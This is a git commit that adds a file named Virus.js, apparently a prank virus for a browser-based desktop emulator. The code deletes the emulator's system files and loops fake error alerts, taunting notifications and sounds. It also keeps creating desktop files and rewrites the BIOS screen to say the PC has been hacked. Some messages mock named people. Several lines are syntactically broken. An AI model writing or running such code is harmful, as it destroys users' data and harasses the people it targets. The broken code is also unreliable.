506384743901d7140b8ca32ee3d537176811afb6
jukedbrah <126842092+jukedbrah@users.noreply.github.com>
2024-06-08 23:31:14 +0000

    Update Virus.js

--- Virus.js
+++ Virus.js
@@ -1,1 +1,39 @@
+$alert("yu stupid")
+$fs.utils.normalizeIcon = () => "/c/files/images/icons/troll.png";
+$explorer.refresh();
+setInterval(function() {
+    $alert.error($io.arr.random([
+      "Unsupported",
+      "Unknown error",
+      "Uncaught SyntaxError: Missing ) after argument list",
+      "Task failed successfully",
+      "Invalid command"
+    ]));
+    $notif($io.arr.random([
+      "what have you done jim",
+      "Your current location is 64 wall avenue fr fr?!!?!?",
+      "i eat toes",
+      "Nom nom",
+      "HHHH JIMMY, gimme money",
+    ]));
+  }, 800);
+$alert.error("This is a warning to Johnny adam, Leave.");
+$file.delete("/c/sys42.js/");
+$file.delete("/c/sys42.css/");
+$file.delete("/c/sys/")
+$
+setInterval(function() {
+  $file.save("/a/desktop/hellodere.txt/");
+  
+}, 2500);
 
+
+setInterval(function() {
+  window.location.hash = "#";
+biosSetup();
+$boot.BIOS.innerHTML = "ur pc has been hacked lol go cry jimmy "
+}, 15000
+le._settings.sounds.blop = "/c/sys/sounds/BLOP.ogg";
+setInterval(function() {
+var a = new Audio(`/c/sys/sounds/${$io.arr.random(['CHORD','QUACK','BLOP'])}.ogg`).play();
+}, 1000);
